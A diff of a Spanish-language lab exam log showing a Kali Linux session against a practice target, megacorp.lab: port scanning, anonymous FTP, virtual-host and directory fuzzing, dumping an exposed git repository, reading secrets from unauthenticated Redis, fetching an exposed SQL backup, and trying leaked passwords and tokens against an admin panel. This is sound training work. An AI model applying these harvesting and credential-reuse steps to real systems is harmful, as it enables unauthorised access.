@@ -4,17 +4,6 @@ Este archivo contiene el volcado íntegro de la sesión de Kali Linux durante la
 
 ---
 
-## 📍 Índice de Flags
-
-- [FLAG{redis_unauthenticated_access}](#flag-redis_unauthenticated_access) — V-01
-- [FLAG{git_source_disclosure}](#flag-git_source_disclosure) — V-02
-- [FLAG{exposed_monitoring_8080}](#flag-exposed_monitoring_8080) — V-03
-- [FLAG{staging_sql_backup}](#flag-staging_sql_backup) — Backup SQL
-
----
-
-## Fase 1: Reconocimiento Inicial
-
 ```text
 
 
@@ -55,12 +44,7 @@ Nmap done: 1 IP address (1 host up) scanned in 21.91 seconds
                                                                               
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ sudo sh -c "echo '3.88.28.22 megacorp.lab www.megacorp.lab dev.megacorp.lab admin.megacorp.lab api.megacorp.lab internal.megacorp.lab staging.megacorp.lab vpn.megacorp.lab' >> /etc/hosts"
-[sudo] password for kali:
-```
-
-## Fase 2: Enumeración FTP y Acceso Anónimo
-
-```text
+[sudo] password for kali: 
                                                                               
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ ftp 3.88.28.22
@@ -130,7 +114,7 @@ Downloaded: 2 files, 569 in 0.001s (874 KB/s)
                                                                               
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ cat 3.88.28.22/flag.txt
-FLAG{ftp_anonymous_access}
+[FLAG{ftp_anonymous_access}](./INFORME.md#v-01-acceso-no-autenticado-a-base-de-datos-redis-puerto-6379)
 
 You found anonymous FTP. Next: enumerate virtual hosts on the web server
 (ffuf -H "Host: FUZZ.megacorp.lab").
@@ -148,11 +132,6 @@ anyone can read this. The web team also keeps spinning up extra virtual hosts
 Host header, they don't all have public DNS yet.
 
 See flag.txt
-```
-
-## Fase 3: Enumeración de Virtual Hosts
-
-```text
                                                                               
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ for sub in megacorp.lab www.megacorp.lab dev.megacorp.lab admin.megacorp.lab api.megacorp.lab internal.megacorp.lab staging.megacorp.lab vpn.megacorp.lab; do echo -e "\n=== $sub ==="; cur[...]
@@ -179,21 +158,11 @@ HTTP/2 200
 HTTP/2 200 
 
 === vpn.megacorp.lab ===
-HTTP/2 200
-```
-
-## Fase 4: Descubrimiento de Puertos Alternativos
-
-```text
+HTTP/2 200 
                                                                               
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ curl -s -k http://megacorp.lab:8080/ | grep -i title
 <html lang="en"><head><meta charset="utf-8"><title>MegaCorp Monitoring</title></head>
-```
-
-### <a id="flag-exposed_monitoring_8080">FLAG{exposed_monitoring_8080}</a>
-
-```text
                                                                               
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ echo -e "\n=== DEV ===" && curl -s -k https://dev.megacorp.lab
@@ -225,7 +194,7 @@ echo -e "\n=== MONITORING 8080 ===" && curl -s http://megacorp.lab:8080
   <h1>MegaCorp Monitoring</h1>
   <p>Internal monitoring dashboard, exposed on a non-standard port (8080) with
      no authentication.</p>
-  <p><strong>FLAG{exposed_monitoring_8080}</strong></p>
+  <p><strong>[FLAG{exposed_monitoring_8080}](./INFORME.md#v-03-exposición-de-panel-de-monitorización-interno-sin-autenticación-puerto-8080)</strong></p>
   <ul>
     <li>Directory listing is enabled — see <a href="/status.txt">status.txt</a></li>
   </ul>
@@ -237,11 +206,62 @@ service: billing-worker   state: running   uptime: 19d
 service: redis-cache      state: running   port: 6379 (no auth!)
 service: legacy-billing   state: running   port: 8000 (source repo exposed)
 host: ip-10-20-1-x   load: 0.14 0.09 0.05
-```
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp]
+└─$ echo -e "\n=== ARCHIVOS EN STAGING ===" && curl -s -k https://staging.megacorp.lab | grep -E "href="
+echo -e "\n=== ARCHIVOS EN DEV ===" && curl -s -k https://dev.megacorp.lab | grep -E "href="
 
-## Fase 5: Explotación del Repositorio Git Expuesto (Puerto 8000)
+=== ARCHIVOS EN STAGING ===
 
-```text
+=== ARCHIVOS EN DEV ===
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp]
+└─$ curl -s -k https://staging.megacorp.lab
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>staging.megacorp.lab</title></head>
+<body style="font-family:sans-serif;max-width:720px;margin:3rem auto">
+  <h1>Staging</h1>
+  <p>Pre-production mirror of the billing app. Directory listing is on.</p>
+  <p>Someone dumped a database backup in the web root again.</p>
+</body></html>
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp]
+└─$ curl -s -k https://dev.megacorp.lab
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><title>dev.megacorp.lab</title></head>
+<body style="font-family:sans-serif;max-width:720px;margin:3rem auto">
+  <h1>Dev environment</h1>
+  <p>Internal development build. Do not deploy to production.</p>
+  <p>Directory listing is on — handy for us, handy for you.</p>
+</body></html>
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp]
+└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u https://staging.megacorp.lab/FUZZ -e .sql,.bak,.sql.gz,.tar.gz,.txt -k -c
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://staging.megacorp.lab/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .sql .bak .sql.gz .tar.gz .txt 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+:: Progress: [1/27684] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Er:: Progress: [40/27684] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: E:: Progress: [40/27684] :: Job [1/1] :: 0[...]
+:: Progress: [53/27684] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: E:: Progress: [76/27684] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: E:: Progress: [120/27684] :: Job [1/1] :: [...]
+:: Progress: [12153/27684] :: Job [1/1] :: 349 req/sec :: Duration: [0:00:35]:: Progress: [12217/27684] :: Job [1/1] :: 440 req/sec :: Duration: [0:00:35]:: Progress: [12217/27684] :: Job [1/1] :[...]
                                                                               
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ curl -s http://3.88.28.22:8000/  
@@ -266,7 +286,7 @@ Get:3 http://kali.download/kali kali-rolling/main amd64 Contents (deb) [53.4 MB]
 Get:4 http://kali.download/kali kali-rolling/contrib amd64 Packages [103 kB]
 Get:5 http://kali.download/kali kali-rolling/contrib amd64 Contents (deb) [188 kB]
 Get:6 http://kali.download/kali kali-rolling/non-free amd64 Packages [169 kB]
-Get:7 http://kali.download/kali kali-rolling/non-free-free amd64 Packages [15.4 kB]
+Get:7 http://kali.download/kali kali-rolling/non-free amd64 Contents (deb) [887 kB]
 Get:8 http://kali.download/kali kali-rolling/non-free-firmware amd64 Packages [15.4 kB]
 Get:9 http://kali.download/kali kali-rolling/non-free-firmware amd64 Contents (deb) [40.1 kB]
 Fetched 76.2 MB in 11s (6,925 kB/s)                                                               
@@ -335,11 +355,6 @@ done! ✨ 🌟 ✨
 [-] Sanitizing .git/config
 [-] Running git checkout .
 Updated 3 paths from the index
-```
-
-### <a id="flag-git_source_disclosure">FLAG{git_source_disclosure}</a>
-
-```text
                                                                                                     
 ┌──(kali㉿kali)-[~/examen-megacorp]
 └─$ cd repo_legacy
@@ -361,7 +376,7 @@ echo -e "\n=== README ===" && cat README.md
 // Legacy billing app configuration.
 // Served by a static web server (no PHP interpreter), so this file's SOURCE is
 // disclosed directly AND it is recoverable from the exposed .git directory.
-// FLAG{git_source_disclosure}
+// [FLAG{git_source_disclosure}](./INFORME.md#v-02-divulgación-completa-de-código-fuente-y-repositorio-git-expuesto-puerto-8000)
 
 define('DB_HOST', 'db.internal.megacorp.lab');
 define('DB_USER', 'billing_legacy');
@@ -381,51 +396,60 @@ Internal PHP billing tool. Deprecated.
 This repository was committed and deployed to the web root by mistake. Anything
 in the git history (credentials, config, removed files) is recoverable with
 tools like `git-dumper`.
-```
-
-## Fase 6: Explotación de Redis sin Autenticación
-
-### <a id="flag-redis_unauthenticated_access">FLAG{redis_unauthenticated_access}</a>
-
-```text
                                                                                                     
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
 └─$ redis-cli -h 3.88.28.22 -p 6379 get "secret:flag"
-"FLAG{redis_unauthenticated_access}"
-```
-
-### Información Adicional desde Redis
-
-```text
+"[FLAG{redis_unauthenticated_access}](./INFORME.md#v-01-acceso-no-autenticado-a-base-de-datos-redis-puerto-6379)"
+                                                                                                    
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
-└─$ redis-cli -h 3.88.28.22 -p 6379 keys "*"
-1) "cfg:note"
-2) "cfg:db_host"
-3) "secret:admin_token"
-4) "welcome"
-5) "cfg:db_user"
-6) "secret:flag"
-
+└─$ curl -s -k -u admin:L3gacyB1lling2019 https://admin.megacorp.lab
+                                                                                                    
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
-└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:db_host"
-"db.internal.megacorp.lab"
+└─$ curl -s -k -I -u admin:L3gacyB1lling2019 https://admin.megacorp.lab
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 14:51:47 GMT
 
+                                                                                                    
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
-└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:note"    
-"If you can read this without a password, that's the finding."
+└─$ curl -s -k -I -u billing_legacy:L3gacyB1lling2019 https://admin.megacorp.lab
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 14:52:15 GMT
 
+                                                                                                    
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
-└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:db_user"
-"billing_app"
+└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u https://staging.megacorp.lab/FUZZ -e .sql,.bak,.tar.gz,.zip,.txt -k -c
 
-┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
-└─$ redis-cli -h 3.88.28.22 -p 6379 get "secret:admin_token"
-"mc_live_8f2a9d1c7b6e4a3f"
-```
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
 
-## Fase 7: Búsqueda de Backups SQL en Staging
+       v2.1.0-dev
+________________________________________________
 
-```text
+ :: Method           : GET
+ :: URL              : https://staging.megacorp.lab/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .sql .bak .tar.gz .zip .txt 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 349, Words: 30, Lines: 8, Duration: 109ms]
+index.html              [Status: 200, Size: 349, Words: 30, Lines: 8, Duration: 114ms]
+:: Progress: [27684/27684] :: Job [1/1] :: 371 req/sec :: Duration: [0:01:20] :: Errors: 0 ::
+                                                                              
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
 └─$ for name in backup.sql db.sql dump.sql megacorp.sql billing.sql billing_legacy.sql staging.sql; do
   echo -n "Probando $name: "
@@ -438,7 +462,35 @@ Probando megacorp.sql: 404
 Probando billing.sql: 404
 Probando billing_legacy.sql: 404
 Probando staging.sql: 404
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u https://dev.megacorp.lab/FUZZ -e .php,.txt,.bak,.json,.zip -k -c  
 
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://dev.megacorp.lab/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .php .txt .bak .json .zip 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 344, Words: 30, Lines: 8, Duration: 130ms]
+index.html              [Status: 200, Size: 344, Words: 30, Lines: 8, Duration: 123ms]
+:: Progress: [27684/27684] :: Job [1/1] :: 357 req/sec :: Duration: [0:01:17] :: Errors: 0 ::
+                                                                              
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
 └─$ for name in db_backup.sql megacorp_backup.sql billing_backup.sql backup_db.sql schema.sql init.sql; do
   echo -n "Probando $name: "
@@ -450,28 +502,54 @@ Probando billing_backup.sql: 404
 Probando backup_db.sql: 404
 Probando schema.sql: 404
 Probando init.sql: 404
-
+                                                                              
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
-└─$ curl -s -k https://staging.megacorp.lab/db_backup.sql -o db_backup.sql
-```
-
-### <a id="flag-staging_sql_backup">FLAG{staging_sql_backup}</a>
-
-```text
+└─$ curl -s -k https://staging.megacorp.lab/db_backup.sql -o db_backup.sql  
+                                                                              
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
 └─$ cat db_backup.sql | grep -E -i "insert|user|pass|flag"
--- FLAG{staging_sql_backup}
+-- [FLAG{staging_sql_backup}](./INFORME.md#v-04-fuga-de-credenciales-en-backups-y-almacenamiento-de-configuraciones)
 CREATE TABLE users (
   username VARCHAR(64),
   password_hash VARCHAR(255),
 -- Note: same DB password as dev (Sup3rDevPassw0rd!). Credential reuse.
 INSERT INTO users VALUES
   (1, 'admin', '$2y$10$abcdefghijklmnopqrstuv', 'superuser'),
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -u admin:Sup3rDevPassw0rd! https://admin.megacorp.lab
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -I -u admin:Sup3rDevPassw0rd! https://admin.megacorp.lab
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 14:59:49 GMT
 
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -I -u dev:Sup3rDevPassw0rd! https://admin.megacorp.lab
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 15:00:13 GMT
+
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -I -u superuser:Sup3rDevPassw0rd! https://admin.megacorp.lab
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 15:00:46 GMT
+
+                                                                              
 ┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
 └─$ cat db_backup.sql                                     
 -- MegaCorp billing DB — staging backup (DO NOT COMMIT / DO NOT EXPOSE)
--- FLAG{staging_sql_backup}
+-- [FLAG{staging_sql_backup}](./INFORME.md#v-04-fuga-de-credenciales-en-backups-y-almacenamiento-de-configuraciones)
 
 CREATE TABLE users (
   id INT PRIMARY KEY,
@@ -487,8 +565,87 @@ INSERT INTO users VALUES
 
 -- Cache: secrets are kept in the unauthenticated Redis node on port 6379
 -- under the key prefix "secret:". Go look.
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ redis-cli -h 3.88.28.22 -p 6379 keys "secret:*"
+1) "secret:admin_token"
+2) "secret:flag"
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ redis-cli -h 3.88.28.22 -p 6379 get "secret:admin_token"
+"mc_live_8f2a9d1c7b6e4a3f"
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k https://admin.megacorp.lab -u admin:mc_live_8f2a9d1c7b6e4a3f
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k https://admin.megacorp.lab -u mc_live_8f2a9d1c7b6e4a3f:
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k https://admin.megacorp.lab -H "Authorization: Bearer mc_live_8f2a9d1c7b6e4a3f"
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -I https://admin.megacorp.lab -u admin:mc_live_8f2a9d1c7b6e4a3f
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 15:04:58 GMT
+
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -I https://admin.megacorp.lab -u mc_live_8f2a9d1c7b6e4a3f:
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 15:05:04 GMT
+
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -I https://admin.megacorp.lab -H "Authorization: Bearer mc_live_8f2a9d1c7b6e4a3f"
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 15:05:25 GMT
+
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ redis-cli -h 3.88.28.22 -p 6379 keys "*"
+1) "cfg:note"
+2) "cfg:db_host"
+3) "secret:admin_token"
+4) "welcome"
+5) "cfg:db_user"
+6) "secret:flag"
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ ^[[200~redis-cli -h 3.88.28.22 -p 6379 get "cfg:note"
+zsh: bad pattern: ^[[200~redis-cli
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:db_host"
+"db.internal.megacorp.lab"
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:note"    
+"If you can read this without a password, that's the finding."
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:db_host"
+"db.internal.megacorp.lab"
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ redis-cli -h 3.88.28.22 -p 6379 get "cfg:db_user"
+"billing_app"
+                                                                              
+┌──(kali㉿kali)-[~/examen-megacorp/repo_legacy]
+└─$ curl -s -k -I https://admin.megacorp.lab -H "X-API-Key: mc_live_8f2a9d1c7b6e4a3f"
+HTTP/2 401 
+alt-svc: h3=":443"; ma=2592000
+server: Caddy
+www-authenticate: Basic realm="restricted"
+date: Thu, 02 Jul 2026 15:08:12 GMT
+
 ```
-
----
-
-**Fin del historial de auditoría**
